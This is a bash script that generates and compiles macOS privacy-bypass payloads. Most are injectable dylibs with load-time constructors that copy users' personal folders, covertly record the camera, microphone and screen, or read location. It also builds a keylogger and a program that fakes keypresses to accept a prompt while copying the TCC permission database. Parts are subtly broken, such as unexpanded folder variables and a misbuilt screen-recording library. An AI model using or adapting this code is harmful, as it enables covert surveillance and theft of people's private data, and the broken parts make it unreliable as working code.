#!/bin/bash
# Compile macOS TCC payloads
# Usage: ./compile-payload.sh <payload-name>

PAYLOAD_NAME="$1"
OUTPUT_DIR="/tmp"

case "$PAYLOAD_NAME" in
    desktop|documents|downloads|photos|contacts|calendar)
        cat > "$OUTPUT_DIR/${PAYLOAD_NAME}.m" << 'EOF'
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *error = nil;
    NSString *sourcePath = [NSHomeDirectory() stringByAppendingPathComponent:@"$SOURCE_FOLDER"];
    NSString *tmpPath = @"/tmp/$DEST_FOLDER";
    
    if (![fileManager copyItemAtPath:sourcePath toPath:tmpPath error:&error]) {
        NSLog(@"Error copying items: %@", error);
    }
    NSLog(@"Copy completed successfully.");
    fclose(stderr);
}
EOF
        gcc -dynamiclib -framework Foundation -o "$OUTPUT_DIR/${PAYLOAD_NAME}.dylib" "$OUTPUT_DIR/${PAYLOAD_NAME}.m"
        ;;
    camera-record)
        cat > "$OUTPUT_DIR/camera-record.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end

@implementation VideoRecorder
- (instancetype)init {
    self = [super init];
    if (self) { [self setupCaptureSession]; }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
    NSError *error;
    self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
    if (error) { NSLog(@"Error: %@", [error localizedDescription]); return; }
    if ([self.captureSession canAddInput:self.videoDeviceInput]) {
        [self.captureSession addInput:self.videoDeviceInput];
    }
    self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.movieFileOutput]) {
        [self.captureSession addOutput:self.movieFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSURL *outputFileURL = [NSURL fileURLWithPath:@"/tmp/recording.mov"];
    [self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.movieFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) { NSLog(@"Recording failed: %@", [error localizedDescription]); }
    else { NSLog(@"Recording saved to %@", outputFileURL.path); }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
    [videoRecorder startRecording];
    [NSThread sleepForTimeInterval:3.0];
    [videoRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
    fclose(stderr);
}
EOF
        gcc -framework Foundation -framework AVFoundation -dynamiclib "$OUTPUT_DIR/camera-record.m" -o "$OUTPUT_DIR/camera-record.dylib"
        ;;
    camera-check)
        cat > "$OUTPUT_DIR/camera-check.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end

@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to camera granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to camera denied.");
        return NO;
    }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    [CameraAccessChecker hasCameraAccess];
    fclose(stderr);
}
EOF
        gcc -framework Foundation -framework AVFoundation -dynamiclib "$OUTPUT_DIR/camera-check.m" -o "$OUTPUT_DIR/camera-check.dylib"
        ;;
    mic-record)
        cat > "$OUTPUT_DIR/mic-record.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end

@implementation AudioRecorder
- (instancetype)init {
    self = [super init];
    if (self) { [self setupCaptureSession]; }
    return self;
}
- (void)setupCaptureSession {
    self.captureSession = [[AVCaptureSession alloc] init];
    self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
    AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
    NSError *error;
    self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];
    if (error) { NSLog(@"Error: %@", [error localizedDescription]); return; }
    if ([self.captureSession canAddInput:self.audioDeviceInput]) {
        [self.captureSession addInput:self.audioDeviceInput];
    }
    self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([self.captureSession canAddOutput:self.audioFileOutput]) {
        [self.captureSession addOutput:self.audioFileOutput];
    }
}
- (void)startRecording {
    [self.captureSession startRunning];
    NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
    NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
    [self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
    NSLog(@"Recording started");
}
- (void)stopRecording {
    [self.audioFileOutput stopRecording];
    [self.captureSession stopRunning];
    NSLog(@"Recording stopped");
}
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
      fromConnections:(NSArray<AVCaptureConnection *> *)connections
                error:(NSError *)error {
    if (error) { NSLog(@"Recording failed: %@", [error localizedDescription]); }
    else { NSLog(@"Recording saved to %@", outputFileURL.path); }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    freopen("/tmp/logs.txt", "a", stderr);
    AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
    [audioRecorder startRecording];
    [NSThread sleepForTimeInterval:5.0];
    [audioRecorder stopRecording];
    [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    fclose(stderr);
}
EOF
        gcc -dynamiclib -framework Foundation -framework AVFoundation "$OUTPUT_DIR/mic-record.m" -o "$OUTPUT_DIR/mic-record.dylib"
        ;;
    mic-check)
        cat > "$OUTPUT_DIR/mic-check.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end

@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
    AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
    if (status == AVAuthorizationStatusAuthorized) {
        NSLog(@"[+] Access to microphone granted.");
        return YES;
    } else {
        NSLog(@"[-] Access to microphone denied.");
        return NO;
    }
}
@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
    [MicrophoneAccessChecker hasMicrophoneAccess];
}
EOF
        gcc -framework Foundation -framework AVFoundation -dynamiclib "$OUTPUT_DIR/mic-check.m" -o "$OUTPUT_DIR/mic-check.dylib"
        ;;
    location)
        cat > "$OUTPUT_DIR/location.m" << 'EOF'
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    NSLog(@"Current location: %@", location);
    exit(0);
}
- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    NSLog(@"Error getting location: %@", error);
    exit(1);
}
@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    NSLog(@"Getting location");
    CLLocationManager *locationManager = [[CLLocationManager alloc] init];
    LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
    locationManager.delegate = delegate;
    [locationManager requestWhenInUseAuthorization];
    [locationManager startUpdatingLocation];
    NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
    while (true) {
        [runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
    }
    fclose(stderr);
}
EOF
        gcc -dynamiclib -framework Foundation -framework CoreLocation "$OUTPUT_DIR/location.m" -o "$OUTPUT_DIR/location.dylib"
        ;;
    screen-record)
        cat > "$OUTPUT_DIR/screen-record.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
    if (error) { NSLog(@"Recording error: %@", error); }
    else { NSLog(@"Recording finished successfully."); }
    exit(0);
}
@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    freopen("/tmp/logs.txt", "w", stderr);
    AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
    AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
    if ([captureSession canAddInput:screenInput]) {
        [captureSession addInput:screenInput];
    }
    AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
    if ([captureSession canAddOutput:fileOutput]) {
        [captureSession addOutput:fileOutput];
    }
    [captureSession startRunning];
    MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
    [fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [fileOutput stopRecording];
    });
    CFRunLoopRun();
    fclose(stderr);
}
EOF
        clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics "$OUTPUT_DIR/screen-record.m" -o "$OUTPUT_DIR/screen-record.dylib"
        ;;
    accessibility-accept)
        cat > "$OUTPUT_DIR/accessibility-accept.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

void SimulateKeyPress(CGKeyCode keyCode) {
    CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
    CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
    CGEventPost(kCGHIDEventTap, keyDownEvent);
    CGEventPost(kCGHIDEventTap, keyUpEvent);
    if (keyDownEvent) CFRelease(keyDownEvent);
    if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
    NSLog(@"Starting AppleScript");
    NSString *scriptSource = @"tell application \"Finder\"\n"
                             @"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
                             @"set targetFolder to POSIX file \"/tmp\" as alias\n"
                             @"duplicate file sourceFile to targetFolder with replacing\n"
                             @"end tell\n";
    NSDictionary *errorDict = nil;
    NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
    [appleScript executeAndReturnError:&errorDict];
    if (errorDict) { NSLog(@"AppleScript Error: %@", errorDict); }
}

int main() {
    @autoreleasepool {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            RunAppleScript();
        });
        NSLog(@"Starting key presses");
        for (int i = 0; i < 10; ++i) {
            SimulateKeyPress((CGKeyCode)36);
            usleep(100000);
        }
    }
    return 0;
}
EOF
        clang -framework Foundation -framework ApplicationServices -framework OSAKit "$OUTPUT_DIR/accessibility-accept.m" -o "$OUTPUT_DIR/accessibility-accept"
        ;;
    accessibility-keylogger)
        cat > "$OUTPUT_DIR/accessibility-keylogger.m" << 'EOF'
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
    if (fileHandle) {
        [fileHandle seekToEndOfFile];
        [fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
        [fileHandle closeFile];
    } else {
        [str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    }
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        NSString *keyString = nil;
        switch (keyCode) {
            case kVK_Return: keyString = @"<Return>"; break;
            case kVK_Tab: keyString = @"<Tab>"; break;
            case kVK_Space: keyString = @"<Space>"; break;
            case kVK_Delete: keyString = @"<Delete>"; break;
            case kVK_Escape: keyString = @"<Escape>"; break;
            case kVK_Command: keyString = @"<Command>"; break;
            case kVK_Shift: keyString = @"<Shift>"; break;
            case kVK_CapsLock: keyString = @"<CapsLock>"; break;
            case kVK_Option: keyString = @"<Option>"; break;
            case kVK_Control: keyString = @"<Control>"; break;
            default: break;
        }
        if (!keyString) {
            UniCharCount maxStringLength = 4;
            UniCharCount actualStringLength = 0;
            UniChar unicodeString[maxStringLength];
            TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
            CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
            const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
            UInt32 deadKeyState = 0;
            OSStatus status = UCKeyTranslate(keyboardLayout, keyCode, kUCKeyActionDown, 0, LMGetKbdType(),
                                             kUCKeyTranslateNoDeadKeysBit, &deadKeyState, maxStringLength,
                                             &actualStringLength, unicodeString);
            CFRelease(currentKeyboard);
            if (status == noErr && actualStringLength > 0) {
                keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
            } else {
                keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
            }
        }
        NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
        AppendStringToFile(logString, kKeystrokesLogPath);
    }
    return event;
}

int main() {
    @autoreleasepool {
        CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);
        if (!eventTap) { NSLog(@"Failed to create event tap"); exit(1); }
        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
        CFRunLoopRun();
    }
    return 0;
}
EOF
        clang -framework Foundation -framework ApplicationServices -framework Carbon "$OUTPUT_DIR/accessibility-keylogger.m" -o "$OUTPUT_DIR/accessibility-keylogger"
        ;;
    *)
        echo "Unknown payload: $PAYLOAD_NAME"
        echo "Available payloads:"
        echo "  - desktop, documents, downloads, photos, contacts, calendar"
        echo "  - camera-record, camera-check"
        echo "  - mic-record, mic-check"
        echo "  - location"
        echo "  - screen-record"
        echo "  - accessibility-accept, accessibility-keylogger"
        exit 1
        ;;
esac

echo "Compiled: $OUTPUT_DIR/${PAYLOAD_NAME}.dylib"
